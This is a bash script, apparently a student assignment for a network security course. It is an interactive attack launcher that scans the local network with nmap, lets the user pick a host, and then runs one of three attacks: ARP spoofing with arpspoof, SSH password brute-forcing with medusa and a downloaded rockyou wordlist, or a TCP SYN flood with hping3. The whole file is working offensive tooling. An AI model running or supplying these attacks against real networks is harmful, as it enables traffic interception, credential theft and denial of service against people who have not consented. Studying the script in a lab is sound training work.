#!/bin/bash

# Student Name: Lior Maman
# Student Code: s11 (it was s23)
# Program Code: NX220
# Lecturer: David Shiffman

LOG_FILE="/var/log/attack_log.log"

get_ip_list() {

    echo ""
    echo "Scanning for active IP addresses on your network..."

    local ip_range=$(ip route | grep -m1 -oP '(\d{1,3}\.){3}\d{1,3}/\d+')
    mapfile -t ip_list < <(nmap -sn "$ip_range" | grep "Nmap scan report for" | awk '{print $NF}')

    if [[ ${#ip_list[@]} -eq 0 ]]; then
        echo "No active IP addresses found."
        return 1
    fi

    echo ""
    echo "Detected active IP addresses:"
    for i in "${!ip_list[@]}"; do
        echo "[$((i+1))] ${ip_list[$i]}"
    done

    while true; do
        read -p "Choose a target by number (1-${#ip_list[@]}): " choice
        if [[ "$choice" =~ ^[0-9]+$ ]] && (( choice >= 1 && choice <= ${#ip_list[@]} )); then
            target_ip="${ip_list[$((choice-1))]}"
            echo "Selected target: $target_ip"
            break
        else
            echo "Invalid selection. Please try again."
        fi
    done

    return 0
}

show_attacks() {

    echo ""
    echo "Available Attacks:"
    echo "1) ARP Spoofing - Redirects traffic through the attacker by poisoning the victim's ARP table."
    echo "2) Brute-force SSH - Attempts to crack SSH credentials using a username and password list."
    echo "3) DoS (TCP SYN Flood) - Sends a high rate of TCP SYN packets to overwhelm a specific port."
    echo ""
}

log_attack() {

    local attack_name="$1"
    local target_ip="$2"
    local timestamp=$(date '+%Y-%m-%d %H:%M:%S')
    echo "$timestamp | Attack: $attack_name | Target: $target_ip" >> "$LOG_FILE"
}

arp_spoof() {

    echo ""
    echo "You chose ARP Spoofing. Starting the attack..."

    if ! get_ip_list; then
        echo "No target selected. Exiting."
        return
    fi

    while true; do
        read -p "Enter the default gateway IP address: " gateway_ip
        if [[ "$gateway_ip" =~ ^([0-9]{1,3}\.){3}[0-9]{1,3}$ ]]; then
            break
        else
            echo "Invalid IP address format. Please try again."
        fi
    done

    echo "Starting ARP spoofing attack on $target_ip pretending to be $gateway_ip..."
    arpspoof -i eth0 -t "$target_ip" "$gateway_ip"

    log_attack "ARP Spoofing" "$target_ip"
}

brute_force_ssh() {

    echo ""
    echo "You chose Brute-force SSH. Starting the attack..."

    if ! get_ip_list; then
        echo "No target selected. Exiting."
        return
    fi

    while true; do
        read -p "Enter the SSH username: " username
        if [[ -n "$username" ]]; then
            break
        else
            echo "Username cannot be empty. Please try again."
        fi
    done

    read -p "Do you already have a password list file on your machine? (y/n): " has_file
    if [[ "$has_file" =~ ^[Yy]$ ]]; then
        while true; do
            read -p "Enter the full path to your password list file: " passlist
            if [[ -f "$passlist" ]]; then
                break
            else
                echo "File not found. Please try again."
            fi
        done
    else
        read -p "Would you like to download a default password list now? (y/n): " download_choice
        if [[ "$download_choice" =~ ^[Yy]$ ]]; then
            echo "Downloading rockyou-75.txt to current directory..."
            wget -q https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou-75.txt -O ./rockyou.txt
            if [[ -f "rockyou.txt" ]]; then
                echo "Download successful. Using rockyou.txt as your wordlist."
                passlist="./rockyou.txt"
            else
                echo "Download failed. Aborting attack."
                return
            fi
        else
            echo "No password list provided. Aborting."
            return
        fi
    fi

    echo "Launching Medusa brute-force attack on $target_ip..."
    medusa -h "$target_ip" -u "$username" -P "$passlist" -M ssh

    log_attack "Brute-force SSH" "$target_ip"
}


dos_syn_flood() {

    echo ""
    echo "You chose DoS (TCP SYN Flood). Starting the attack..."

    if ! get_ip_list; then
        echo "No target selected. Exiting."
        return
    fi

    read -p "Enter the target port (default: 80): " port
    port=${port:-80}
    echo "Selected port: $port"

    echo "Launching SYN Flood on $target_ip port $port..."
    hping3 -S --flood -p "$port" "$target_ip"

    log_attack "DoS (SYN Flood)" "$target_ip"
}

main() {

    while true; do
        show_attacks

        read -p "Choose an attack by number (1-3) or press 'q' to quit: " choice

        case $choice in
            1)
                arp_spoof
                ;;
            2)
                brute_force_ssh
                ;;
            3)
                dos_syn_flood
                ;;
            [Qq])
                echo "Exiting the program. Goodbye!"
                break
                ;;
            *)
                echo "Invalid choice. Please try again."
                ;;
        esac
    done
}

main
